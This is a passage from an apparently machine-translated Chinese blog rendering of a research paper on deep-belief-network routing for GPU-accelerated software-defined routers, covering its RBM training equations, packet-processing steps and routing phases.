GPU计算架构，如图1所示。其次，我们提出了一种基于深度学习的GPU加速SDR路由表构建方法。在我们的提议中，我们采用有监督的深度信念架构（DBA）[19]来计算以边缘路由器的流量模式为输入的后续节点（即路由器）。第三，我们根据边缘路由器的传入流量模式，为我们采用的DBA提供输入和输出的独特特征。根据收集的数据训练所提出的DBA，所述数据包括入站流量模式和相应的后续节点（即，路由器）。此外，我们还演示了经过培训的DBA如何预测下一个节点。第四，我们展示了基于深度学习的路由策略在较低信令开销和快速收敛方面的优势，从而显着改善了流量控制。第五，我们通过分析和广泛的仿真结果证明了我们提出的基于深度学习的解决方案与基准路由方法相比的有效性。特别是，我们演示了我们的提案如何在GPU加速的SDR上工作，并在分析其复杂性后评估运行路由策略的时间成本。结果表明，所提出的路由策略在GPU上的运行速度比在CPU上快100多倍。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本文的其余结构如下。 第2节包括相关的研究工作。在第3部分中，我们描述了我们提出的路由DBA结构及其在GPU加速SDR中的工作原理。然后，我们在第4节和第5节介绍基于深度学习的路由策略的三个阶段，分析我们提案的复杂性，并比较GPU和CPU的理论时间成本。我们的提案的网络性能评估在第6节中介绍。最后，第7节结束了本文。</p><h1 id="2-相关研究工作"><a href="#2-相关研究工作" class="headerlink" title="2. 相关研究工作"></a>2. 相关研究工作</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本节中，我们将从硬件和软件角度介绍相关的研究工作，分别考虑SDR和深度学习的最新技术。 此外，在讨论深度学习相关研究的同时，我们还描述了文献中存在的相关机器智能路由策略。</p><h2 id="2-1-SDR相关研究工作"><a href="#2-1-SDR相关研究工作" class="headerlink" title="2.1 SDR相关研究工作"></a>2.1 SDR相关研究工作</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于深度学习执行需要高性能计算硬件的支持，因此有必要讨论最先进的SDR技术。尽管将数据包处理逻辑实施到硬件中的方法继续提高路由器的线路速率高达100 Gbps，但应用新的网络流量控制算法仍然是一个具有挑战性的问题，因为在可行性和可扩展性方面存在专用硬件的缺点[6],[20]。另一方面，基于通用硬件的SDR在分组处理中不是很有效，尽管它是可编程的和灵活的。由于多核解决方案可以显着提高计算能力，因此学术界和工业界的研究人员对利用CPU或GPU提供的多核和/或线程并行运行路由任务以提高处理吞吐量表现出极大的兴趣。目前的SDR [6]，[21]。[21]中介绍的RouteBricks架构探索了一种新颖的网络架构，其中数据包在运行在通用PC硬件集群上的软件中处理。RouteBricks的IPv4转发吞吐量已经显示为高达8.7 Gbps和64B数据包。但是，由于CPU成为更多计算密集型应用程序的瓶颈，其性能可能不会超过10 Gbps。作为解决此问题的方法，PacketShader架构[3]将并行数据包处理的计算需求从CPU转移到GPU，因为GPU与CPU相比包含更多内核。使用单个商品PC评估此体系结构表明PacketShader能够以39 Gbps转发64B IPv4数据包。此外，在[3]中指出，通过扩展I / O集线器的性能，线速率可以进一步提高到100 Gbps [7]。此外，包括英特尔和思科在内的网络制造商正在采用类似的项目来开发SDR架构中的高性能计算设备并开发商业产品[4]，[5]。从上述工作中可以注意到，当前的可编程SDR可以提供有竞争力的线路速率（即，与传统的专用设计路由器相比，费用要低得多），同时保持灵活性和可扩展性的强度。</p><h2 id="2-2-深度学习与机器智能路由策略的相关研究工作"><a href="#2-2-深度学习与机器智能路由策略的相关研究工作" class="headerlink" title="2.2 深度学习与机器智能路由策略的相关研究工作"></a>2.2 深度学习与机器智能路由策略的相关研究工作</h2><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_05_02.png" width="80%"><ul><li>图2：考虑系统模型和问题陈述。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于机器学习对于预测网络参数很有用，一些研究人员已经尝试利用人工神经网络（ANN）（一种机器学习技术）来预测网络流量[15]，链路带宽或其他指标[22]。超过几个时间间隔。然而，这些策略的效率受到传统机器学习技术的缺点的限制，主要是因为缺乏适当的深层结构学习算法，足够大的训练数据的可用性等等。实际上，根据[11]中的工作，尽管添加层可以在极其复杂的应用中提取更高级别的特征，但是包含许多隐藏层的传统深度神经网络架构表现出与浅层相比较差的性能。最近，深度学习成为一种有前途的计算模型，可以有效地利用多个处理层从多个抽象层次的数据中提取特征[11]。此方法使用通用非线性模块将一个级别的表示转换为更高和更抽象级别的表示，然后组合这些表示，通过它可以自动且准确地学习特征[23]。 2006年引入了Greedy Layer-Wise培训，利用无监督学习程序对深度神经网络体系结构进行预训练，彻底改变了深度学习技术[19]，[24]。通过Greedy LayerWise预训练，接着是基于反向传播算法的整个深层架构的微调，深度学习在语音识别等许多复杂应用中取得了创纪录的成果[25]等等。将深度学习应用于语音识别的一个很好的例子是Apple的智能助手叫做“Siri”[26]。在传统上由人类主导的其他领域，研究人员已经探索了深度学习的应用并取得了令人鼓舞的成果，例如谷歌的AlphaGo在非常复杂的棋盘游戏中[18]。从文献中可以明显看出，深度学习技术已成为通常需要大量计算的应用中的最新技术。一方面，深度学习应用仅限于图像/字符/模式识别和自然语言处理领域[11]。另一方面，尚未成功尝试对网络流量控制系统的深度学习，其仍继续经历不断增长的计算负担。这是因为连接到互联网的设备数量越来越多，全球网络流量在最近几十年中爆炸式增长[9]。因此，在设计路由策略以满足严格和不断变化的网络要求时，网络运营商需要考虑更多参数和更复杂的规则。根据[16]，深度学习具有很好的潜力，可以应用于网络流量控制系统，通过考虑各种要求来估计最佳路径。此外，由于将深度学习应用于路由仍然是一个非常新的主题，因此以前的研究工作都没有尝试将深度学习整合到SDR中。另一方面，我们的动机来自于SDR与深度学习密切相关的事实，因为许多SDR使用多核平台（例如GPU）。这为在SDR中采用基于深度学习的智能路由策略铺平了道路。从这一点来看，我们尝试通过采用GPU驱动的SDR来执行深度学习技术来估计下一个节点以实现更好的路由管理，从而考虑硬件和软件两个方面。</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_05_03.png" width="80%"><ul><li>图3：考虑提出的深度学习系统的模型。</li></ul><h1 id="3-基于深度学习的路由策略设计"><a href="#3-基于深度学习的路由策略设计" class="headerlink" title="3. 基于深度学习的路由策略设计"></a>3. 基于深度学习的路由策略设计</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本节中，我们将介绍如何设计深度学习结构以在GPU加速的SDR上构建路由表。首先，我们提出深度学习结构的输入和输出的详细表征，然后我们描述我们选择的架构，DBA。 接下来，讨论所提出的路由表构造方法如何在GPU加速的SDR上工作。</p><h2 id="3-1-输入和输出设计"><a href="#3-1-输入和输出设计" class="headerlink" title="3.1 输入和输出设计"></a>3.1 输入和输出设计</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们考虑的核心网络系统模型在图2中描绘，其包括多个有线骨干路由器。值得注意的是，也可以考虑无线骨干网络。在所考虑的网络中，假设边缘路由器连接到不同类型的网络，例如蜂窝网络，WMN等。从后面的网络生成的数据包到达边缘路由器，并且发往其他边缘路由器以进行传送。另一方面，内部路由器只负责将数据包转发到适当的边缘路由器。传统上，每个路由器周期性地将信令分组转发到其他路由器以通知延迟值或其到其邻居的链路的一些其他度量。然后，每个路由器可以利用该信息来计算用于将数据分组发送到目的地路由器的下一个节点。这种方法在大多数情况下都能很好地工作，因为每个路由器都可以根据获得的所有网络链路的信息做出最佳决策。然而，当网络中的一些路由器由于压倒性的流量需求而拥挤时，计算下一个节点的传统方法遭受慢收敛。同时，周期性信令交换加剧了交通拥堵。此外，传统的路由方法无法处理网络环境持续变得更加复杂的场景，这需要网络运营商考虑各种不相关的参数来确定路由规则。由于深度学习方法已应用于许多复杂的活动以自动探索各种输入之间的关系，我们尝试在本节的其余部分采用深度学习进行路由。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于在每个路由器处观察到的流量模式直接指示该路由器的流量情况，因此我们采用流量模式作为深度学习模型的输入。如第1节所述，深度学习结构用于计算路由路径。因此，我们选择路由路径作为模型的输出。因此，图3（a）表明深度结构的输入为业务模式、路由路径作为输出。之后，关键的挑战是如何表征深度学习结构的输入和输出。为了表征输入，我们使用每个路由器上的流量模式即每个时间间隔内路由器的入站数据包数量，如图3（b）所示。如果我们假设计入入站数据包的时间间隔是$\Delta t$秒，那么对于每个路由器，我们可以采用最后一个$\beta \Delta t$（$\beta$为正整数）秒内每个时间间隔内的入站数据包数量作为流量模式。因此，通过假设网络由$N$个路由器组成，我们可以使用$\beta$行和$N$列的矩阵来表示网络中所有路由器的流量模式，并将矩阵中的$\beta N$元素的值输入到深度学习结构的输入层。请注意，$\beta$的值不应该太大，因为很久以前的流量模式对当前网络分析没有影响。此外，如果$\beta$的值太大，则深度学习结构具有高复杂性和低效率。在我们提出的深度学习结构中，仿真结果表明，将$\beta$的值设置为1是足够准确的。因此，深度学习结构的输入可以看作是$N$维向量，其第$i^{th}$个元素是最后$\Delta t$秒内第$i^{th}$个路由器的流量模式。接下来，我们需要设计输出层。出于路由的目的，深度学习结构需要输出路由路径。因此，输出层可以设计为提供类似于集中式路由的整个路径，或者仅提供类似于分布式路由策略的下一个节点。由于其较低的复杂性和较高的容差，后者在我们的提案中被选择。对于由$N$个路由器组成的网络，我们使用由$N$个二进制元素组成的向量来表示输出。在向量中，只有一个元素的值为1，其顺序表示下一个节点。这意味着如果$N$维向量中的第$i^{th}$个元素是1，则选择所考虑的网络中的第$i^{th}$个路由器作为下一个节点。总之，我们可以使用两个$N$维向量$x$和$y$来表示深度学习结构的输入和输出，$x$和$y$的示例如下：</p><p>$$ x = (tp_1, tp_2, …, tp_{N - 1}, tp_N), \tag{1}$$<br>$$ y = (0, 1, …, 0, 0), \tag{2} $$</p><p>其中$tp_i$表示路由器$i$的流量模式，其由上一时间间隔中的入站数据包的数量来度量。 此外，在向量$y$中，我们可以发现$y_2 = 1$，这意味着选择路由器2作为下一个节点。 由于$y$的二进制值，深度学习结构是逻辑回归模型，我们需要接下来设计。</p><h2 id="3-2-深度学习结构设计"><a href="#3-2-深度学习结构设计" class="headerlink" title="3.2 深度学习结构设计"></a>3.2 深度学习结构设计</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了设计深度学习结构，需要用于执行监督训练的标记数据（即，多组$(x, y)$）。 为了完成计算具有流量模式的下一个路由器的任务，我们选择图3（c）所示的DBA作为我们的深度学习结构，因为它在所有深度学习模型中最常见和有效[27]。 如图所示，我们假设DBA由L层，输入层，$x$，输出层，$y$和$(L - 2)$隐藏层组成。 DBA也可以看作是一堆$(L - 2)$受限玻尔兹曼机器（RBMs）和一个逻辑回归层作为顶层。 每个RBM的结构如图3（d）所示。可以看出，每个RBM由两层组成，可见层，$v$和隐藏层$h$。两层中的单元通过加权链路连接，而同一层中的单元未连接。应注意，对两层中的每个单元给予加权偏差。术语$w_{ji}$表示连接隐藏层中的单元$j$和可见层中的单元$i$的链路的重量。此外，$a_i$和$b_j$分别表示可见层中的单元$i$和隐藏层中的单元$j$的偏置。隐藏层中学习单元的激活值用作DBA中上RBM的“可见数据”。如第2.2节所述，深度学习训练过程包括两个步骤：初始化结构的Greedy Layer-Wise训练和微调结构的反向传播过程。对于DBA，初始过程是训练每个RBM，这是一个无监督的学习过程，原因是RBM是一个无向图形模型，其中可见层中的单元使用对称加权连接连接到随机隐藏单元，如图所示.3（d）[28]。在训练RBM时，将未标记的数据集给予可见层，并且重复调整权重和偏差的值，直到隐藏层可以重建可见层。因此，训练后的隐藏层可以看作是可见层的抽象特征。训练RBM是使隐藏层最小化重建错误的过程。为了对训练过程进行数学建模，我们使用如下给出的可见层的对数似然函数。然后，训练过程是更新权重和偏差的值以最大化对数似然函数的值。</p><p>$$ l(\theta, a) = \sum_{t = 1}^{m} log p(v^{(t)}) \tag{3} $$</p><p>其中$\theta$表示由隐藏层的权重和偏差的所有值组成的向量。 $\theta$可写为$\theta = (w, b)$。$w$和$b$分别表示由隐藏单元$b_j$的所有权重，$w_{ji}$和偏差组成的向量。 $a$由可见单元的偏差组成，$a_i$。 $m$表示训练数据的数量。 $v^{(t)}$是$t^{th}$训练数据，其概率为$p(v^{(t)})$。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了最大化$l(\theta, a)$，我们可以使用$l(\theta, a)$的梯度下降来调整$w$，$a$和$b$，其可以在等式4和5中描述。</p><p>$$ \theta := \theta + \eta\frac{\partial l(\theta, a)}{\partial \theta} \tag{4} $$</p><p>$$ a_i := a_i + \eta\frac{\partial l(\theta, a)}{\partial a_i} \tag{5} $$</p><p>其中$\eta$是深度学习的学习率。 这里，$\theta$表示任何$w_{ji}$和任何$b_j$。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了计算$p(v)$的值（代表任何$p(v^{(t)})$），我们需要将RBM建模为能量模型，因为RBM是对数线性马尔可夫随机场（MRF）的特定形式[29]。 能量函数$E(v, h)$和联合概率函数$p(v, h)$定义如下。</p><p>$$ E(v, h) = -\sum_{i} a_i v_i - \sum_{j} b_j h_j - \sum_{i}\sum_{j}h_j w_{ji} v_i \tag{6} $$</p><p>$$ p(v, h) = \frac{e^{-E(v, h)}}{Z} \tag{7} $$</p><p>$$ Z = \sum_{v} \sum_{h} e^{-E(v, h)} \tag{8} $$</p><p>其中$v_i$和$h_j$分别是图3（d）所示的可见层中的单元$i$和隐藏层中的单元$j$。 $Z$表示归一化常数分区函数。 此外，$p(v)$和$p(v, h)$之间的关系可以表示如下。</p><p>$$ p(v) = \sum_{h} p(v, h) \tag{9} $$</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们可以使用等式3到9来获得$\theta$[28]的值。然而，等式8中$\sum_{v} \sum_{h}$的计算的复杂度是$2^{n_v + n_h}$，其非常高（$n_v$和$n_h$分别表示向量$v$和$h$的维度）。另一个问题是，为了计算等式8，有必要但不可能考虑$v$和$h$的所有可能值而不是仅考虑所获得的训练数据。为了解决这些问题，Hinton等人。提出了对比分歧（CD）方法[30]。 CD的主要思想是使用吉布斯采样方法对v和h的值进行采样以逼近实际值，因为一层的条件分布概率（同时给出了另一层的值），例如$p(v | h; \theta, a)$，可以计算出来。文中省略了CD的详细程序，可以在[30]中找到。由于每个单元的值独立于同一层中的其他单元，当一个层固定时，另一层的条件分布概率可以如下计算，</p><p>$$ p(v | h; \theta, a) = \prod_i p(v_i | h; \theta, a) \tag{10} $$</p><p>$$ p(h | v; \theta, a) = \prod_j p(h_j | v; \theta, a) \tag{11} $$</p><p>其中$p(v | h; \theta, a)$和$p(h | v; \theta, a)$分别是给定h的v的条件概率和给定$v$的$h$的条件概率。$p(v_i | h; \theta, a)$是隐藏层固定时可见层中单元$i$的条件概率分布。 此外，$p(h_j | v; \theta, a)$是当可见层固定时隐藏层中单元$j$的条件概率分布。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果可见层和隐藏层中的单元的值都是二进制的，则$p(v_i = 1 | h; \theta, a)$和$p(h_j = 1 | v; \theta, a)$如下给出。</p><p>$$ p(v_i = 1 | h; \theta, a) = sigm(\sum_{j} w_{ji} h_j + a_i) \tag{12} $$</p><p>$$ p(h_j = 1 | v; \theta, a) = sigm(\sum_{i} w_{ji} v_i + b_j) \tag{13} $$</p><p>其中$sigm$表示$sigmoid$激活函数，$sigm(x) = \frac{1}{1 + e^{-x}}$。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于表示入站数据包数量的DBA输入单元的值是连续的并受许多因素的影响，我们使用高斯概率分布来模拟流量模式[31]。因此，对于我们提出的DBA中的$RBM_1$，等式6和等式12应该修改如下。</p><p>$$ E(v, h) = -\sum_{i} \frac{(v_i - a_i)^2}{2\sigma_i^2} - \sum_{j} b_j h_j - \sum_{i}\sum_{j} \frac{v_i}{\sigma_i} h_j w_{ji} \tag{14} $$</p><p>$$ p(v_i | h; \theta, a) = N(a_i + \sigma_i \sum_{j} h_j w_{ji}, \sigma_i^2) \tag{15} $$</p><p>其中$\sigma_i$是单位$v_i$的方差值。 $N(a_i + \sigma_i \sum_{j} h_j w_{ji}, \sigma_i^2)$表示具有平均值$(a_i + \sigma_i \sum_{j} h_j w_{ji})$和方差$\sigma_i$的高斯分布。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图3（b）所示，最后一个RBM, $RBM_{L - 2}$由三层DBA组成，因为DBA在我们的提案中经过了监督培训[32]。 因此，$RBM_{L - 2}$的可见层不仅包括$RBM_{L - 3}$的隐藏层，还包括DBA的输出层$y$。 它的隐藏层是DBA的顶层隐藏层。 $RBM_{L - 2}$的结构如图3（e）所示，其能量函数表示如下。 为了与其他RBM保持一致，我们使用$v$和$h$分别表示$RBM_{L - 3}$的隐藏层和顶部隐藏层。</p><p>$$ E(v, h, y) = -\sum_{i} a_i v_i - \sum_{j} b_j h_j - \sum_{k} c_k y_k \\ - \sum_{i} \sum_{j} h_j w_{ji} v_i - \sum_{j} \sum_{k} h_j w_{jk} y_k \tag{16} $$</p><p>其中$y$表示输出层中的向量。 $c_k$是单位$y_k$的偏差。 $w_{jk}$表示连接单元$h_j$和$y_k$的链路的权重。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于$v$和$y$中的单位彼此独立，因此由$v$和$y$组成的连接向量的条件分布是，</p><p>$$ p(v, y | h; \theta, a) = p(v | h; \theta, a)p(y | h; \theta, a) \\ = \prod_{i} p(v_i | h; \theta, a) \prod_{k} p(y_k | h; \theta, a) \tag{17} $$</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们使用上述方法来训练每个RBM。 在给定的训练数据中，第一RBM的可见层的值是$x$。 并且在训练每个RBM之后，其隐藏层的学习激活值被用作DBA中下一个RBM的“数据”。 在这里，我们可以发现，我们通过训练RBM一次训练DBA的一个隐藏层。 以这种方式，DBA被初始化并且$\theta$的值几乎是最佳的。 然后利用反向传播的方法来微调DBA。 我们监督训练的目的是最小化DBA的输出（由$h_\theta(x)$表示）与标记的输出$y$之间的差异。 我们使用交叉熵成本函数来测量它们在公式18 [28]中给出的差异。</p><p>$$ C(\theta) = -\frac{1}{m} \sum_{t = 1}^{m} (y^{(t)} log(h_\theta(x^{(t)})) \\ + (1 - y^{(t)}) log(1 - h_\theta(x^{(t)}))) \\ + \frac{\lambda}{2} \sum_{l = 2}^{L} \sum_{j = 1}^{n_l} \sum_{i = 1}^{n_{l - 1}} (w_{ji}^{(l)})^2 \tag{18} $$</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_15_04.png" width="80%"> - 图4：GPU的架构以及如何在GPU加速的SDR中传递数据包的步骤。<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里，$(x^{(t)}, y^{(t)})$是$t^{th}$训练数据。 $h_\theta(x^{(t)})$表示当DBA的参数是$\theta$并且输入是$x^{(t)}$时DBA的输出。 在等式的右边，我们可以发现$C(\theta)$由两部分组成。 第一部分表示DBA输出与标记输出之间的差异，当$y^{(t)} = h_\theta(x^{(t)}) = 0$或1时，对于所有$t$，其值为0，否则，大于0。 part用于防止训练过程过度拟合。 为了最小化反向传播过程中$C(\theta)$的值，我们使用$C(\theta)$的梯度下降来更新$\theta$，如公式19 [33]所示。</p><p>$$ \theta := \theta - \eta_{bp}\frac{\partial C(\theta)}{\partial \theta} \tag{19} $$</p><p>其中$\eta_{bp}$是反向传播过程中的学习率。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;微调算法有效地工作，因为$\theta$的值通过Greedy LayerWise训练方法得到很好的初始化，而不是随机设置。 在微调DBA之后，我们可以获得参数$\theta(w, b)$的最佳值。 $a$的值不在反向传播步骤中训练，因为它不属于最终的DBA，并且仅用于训练每个RBM。 在本节的其余部分，我们将演示如何在GPU加速的SDR中使用所提出的深度学习结构。</p><h2 id="3-3-考虑路由器架构"><a href="#3-3-考虑路由器架构" class="headerlink" title="3.3 考虑路由器架构"></a>3.3 考虑路由器架构</h2><p>在本节中，我们简要介绍了GPU体系结构以及在一般PC平台上工作的基于深度学习的路由策略的过程，可以将其视为我们考虑的SDR。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图4所示，GPU由全局存储器，L2高速缓存和若干流处理多处理器（SM）组成，每个处理器由许多流处理器（SP）组成。 由于GPU具有许多计算核心，因此在接收工作负载时会同时启动数万个线程，并且每个线程在不同的数据集上运行相同的程序。 因此，GPU计算被认为是单指令多数据（SIMD）编程模型，其非常适合于运行深度学习。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如第1部分所述，基于普通PC的GPU加速SDR的报告线速率已高达40 Gbps，在本文中，我们选择一般的基于PC的SDR来构建路由表并执行我们的深度学习基于路由算法。图4示出了分组如何通过所考虑的SDR的架构中的相关四个部分的步骤，即GPU，CPU，网络接口卡（NIC）和主存储器。为了运行基于深度学习的路由算法，每个SDR都需要在训练阶段进行初始化，在此期间，网络中的SDR不需要处理任何数据包，只需利用他们的GPU来训练他们的DBA并记录最终值。他们的DBA的参数。在训练阶段之后，网络中的所有路由器都需要将其DBA的参数值发送到所有边缘路由器。因此，每个边缘路由器都可以使用这些参数来恢复任何DBA，以便在运行阶段构建到任何目标路由器的整个路径，而内部路由器只根据路径转发数据包。如图4所示，我们根据SDR中传输数据包的顺序给出了GPU加速SDR的主要架构和标签。我们可以发现（1）进入NIC的数据包通过直接内存访问（DMA）复制到主机内存。在整个过程中，（2）CPU从主存储器复制一些数据包以填充其缓冲区。 （3）然后在CPU上运行的软件分析这些数据包并采取一些必要的过程，如错误检查，减少寿命等。此外，CPU对不同类型的分组采用不同的过程。 （4）对于数据包，CPU提取标头并将它们发送到GPU的全局存储器，而CPU将整个信令包发送到GPU的存储器。请注意，CPU需要缓冲数据包和信令包的标头，直到达到给定的大小，然后将批量的标头或数据包发送到GPU，而不是逐个发送。由于GPU可以并行处理数百个数据包，因此批处理可以提高吞吐量，而其对延迟的负面影响已被证明可以忽略不计[6]。 （5）在从CPU获得报头和数据包之后，应该注意边缘路由器和内部路由器的GPU执行不同的数据包处理。在边缘路由器的GPU上运行的软件使用信令分组携带的流量模式作为恢复的DBA的输入。然后，DBA可以输出下一个节点，边缘路由器的GPU可以利用这些节点构建数据包的整个路径，并将相应的路径附加到接收的报头。另外，GPU还需要将每个分组的下一个节点信息发送到CPU。另一方面，内部路由器的GPU不需要计算数据包的路径，只需读取数据包头中的路径并将结果发送到CPU。此外，每个GPU并行处理这些标头并在缓冲区中填充它们。然后，CPU（6）从GPU复制处理后的数据包的头部，并且（7）将包复制回主存储器。同时，（8）CPU指示NIC转发批处理的位置，之后，（9）NIC通过另一个DMA从主存储器取出数据包。此外，可以删除将数据包复制到GPU和从GPU复制数据包的过程，因为我们可以利用GPU和CPU的映射存储器，从而可以进一步减少延迟。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本节中，我们提供了我们考虑的系统模型，深度学习结构，并解释了基于GPU的SDR如何利用深度学习结构。 在下一节中，我们将介绍我们提出的基于深度学习的路由算法的步骤。</p><h1 id="4-基于建议的深度学习路由策略的程序"><a href="#4-基于建议的深度学习路由策略的程序" class="headerlink" title="4 基于建议的深度学习路由策略的程序"></a>4 基于建议的深度学习路由策略的程序</h1><p>在本节中，我们将重点介绍利用DBA计算下一个节点的过程，这些节点用于构建图2中所考虑的核心网络中的路由路径。这些过程可分为三个步骤，即初始化，训练和运行阶段。 下面提供了三个阶段的细节。</p><h2 id="4-1-初始化阶段"><a href="#4-1-初始化阶段" class="headerlink" title="4.1 初始化阶段"></a>4.1 初始化阶段</h2><p>在初始化阶段，我们需要获取数据来训练我们提出的DBA。 如第3节所述，我们采用监督学习来训练我们提出的DBA系统。 因此，初始化阶段的目标是获得由输入矢量和相应的输出矢量组成的标记数据。 如前面部分所述，输入向量应该是所考虑的核心网络中路由器的流量模式。 输出向量应指示对应于给定流量模式的下一个节点。 为了获得这种训练数据，我们可以接近许多可用的数据集源，例如应用互联网数据分析中心（CAIDA）[34]，并提取交通信息和相关的路由路径。 另一种方法是在我们考虑的网络中运行传统的路由协议，并记录每个路由器及其路由表的入站数据包的数量。</p><h2 id="4-2-训练阶段"><a href="#4-2-训练阶段" class="headerlink" title="4.2 训练阶段"></a>4.2 训练阶段</h2><p>在培训阶段，我们使用获得的数据来训练我们设计的DBA。 训练过程包括两个步骤：使用Greedy Layer-Wise训练方法初始化每个DBA，并使用反向传播方法微调参数$\theta(w, b)$。 在训练阶段之后，我们可以获得$\theta(w, b)$的值。</p><img src="/2018/12/27/2018-12-27-routeOrComputerTranslate/2019_01_15_05.png" width="80%"><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如第3.1节所述，DBA的输出是表示下一个节点的向量，这意味着它需要几个DBA来构建整个路径。假设网络中只有一个路由器训练并运行所有DBA，并且像网络中的集中控制策略一样产生网络中的所有路径，则路由器的计算量将非常高。而且，这样的中央路由器需要大量的时间和资源来计算所有路径，导致延迟增加和无保证的准确性。为了减少对路由器的计算要求并提高学习准确性，我们将训练任务分成几个部分，并将它们分发到目标核心/骨干网络中的每个路由器。这意味着所考虑的网络中的每个路由器都需要训练多个DBA，每个DBA计算从其自身到目的地路由器的下一个节点。路由器需要训练的DBA数量取决于其目标路由器的数量。设$N$和$I$分别表示路由器的总数和内部路由器的数量。因此，每个内部路由器的目标节点数量是$(N - I)$，而每个边缘路由器具有$(N - I - 1)$个目标节点，因为源路由器和目标路由器不能相同。因此，每个内部路由器都需要训练$(N - I)$DBAs，而所有边缘路由器都需要训练$(N - I - 1)$DBAs。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了更清楚地描述培训阶段，我们只关注一个DBA的培训程序，这也适用于我们提案中的其他DBA。训练DBA的主要程序在算法1中给出。训练阶段的输入是训练数据$(x, y)$以及DBA，$L$和$n$的参数，以及学习速率，$\eta_{CD}$和$\eta_{bp}$。如算法1所示，训练阶段主要包括两个步骤：贪婪层智能训练循环，训练每个RBM，如步骤1至3所示，以及后面的反向传播过程，以微调链接之间的链接权重。步骤4中显示的图层。通过Greedy Layer-Wise训练，DBA初始化时$\theta (w, b)$的值几乎达到全局最优值。然后使用反向传播算法来微调整个结构以最小化成本函数的值。在成本函数不超过给定值或次数达到上限之前，调整过程不会停止。一旦反向传播结束，就记录每个DBA的$\theta (w, b)$的值。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如前所述，每个边缘路由器都需要训练$(N - I - 1)$DBAs，而每个内部路由器需要训练$(N - I)$DBAs，这意味着每个边缘路由器都可以获得$(N - I - 1)$个DBAs的$\theta$ 每个内部路由器可以获得$(N - I)$DBAs的$\theta$。 然后，每个边缘路由器需要将其$(N - 1 - 1)$DBAs的$\theta$发送到其他$(N - 1 -1)$边缘路由器。 此外，每个内部路由器都需要将其$(N - I)$DBAs的$\theta$发送到所有边缘路由器。 因此，每个边缘路由器获得网络中所有路由器的所有DBAs的$\theta$，并且$\theta$的组数是$(N - 1)(N - 1)$。 让$DBA_{ij}$代表路由器$i$中的DBA作为目的路由器$j$，$\theta_{ij}$是其参数。 由于边缘路由器获得网络中所有DBA的$\theta$，因此它们可以用$\theta_{ij}$构造相应的$DBA_{ij}$。 应该注意的是，$i \neq j$。</p><ul><li>表1: $R_3$中内置的路由表</li></ul><table><thead><tr><th align="center">终点</th><th align="center">路径</th></tr></thead><tbody><tr><td align="center">$R_1$</td><td align="center">$R_3 \rightarrow R_2 \rightarrow R_1$</td></tr><tr><td align="center">$R_2$</td><td align="center">$R_3 \rightarrow R_2$</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">$R_{12}$</td><td align="center">$R_3 \rightarrow R_7 \rightarrow R_{11} \rightarrow R_{12}$</td></tr><tr><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">$R_{16}$</td><td align="center">$R_3 \rightarrow R_7 \rightarrow R_{11} \rightarrow R_{15} \rightarrow R_{16}$</td></tr></tbody></table><h2 id="4-3-运行阶段"><a href="#4-3-运行阶段" class="headerlink" title="4.3 运行阶段"></a>4.3 运行阶段</h2><p>在运行阶段，网络中的所有路由器都需要定期将其入站数据包的数量记录为流量模式，并将它们发送到边缘路由器。然后，每个边缘路由器都可以将流量模式输入到其DBA，以获得到其他边缘路由器的下一个节点。此外，由于每个边缘路由器都获得其他路由器的DBAs的参数$\theta$，因此它可以构建网络中的任何DBA并计算从任何路由器到任何目的地边缘路由器的下一个节点。因此，每个边缘路由器可以利用下一个节点信息来构建从自身到所有其他边缘路由器的整个路径。该算法在算法2中示出。这里，我们使用$N$个元素的数组$TP[N]$来保存网络中$N$个路由器的入站分组数以表示流量模式，并且$\theta[N - I][N - 1]$保存网络中所有DBAs的参数。另一个阵列$\varepsilon R[N-I]$用于保存网络中边缘路由器的序列号，因为它们不是连续的。在实际网络情况下，$\varepsilon R [N-I]$用于保存所有目标路由器的IP地址。运行算法2后，每个边缘路由器都可以获得DBA的输出，以构建到$(N - I - 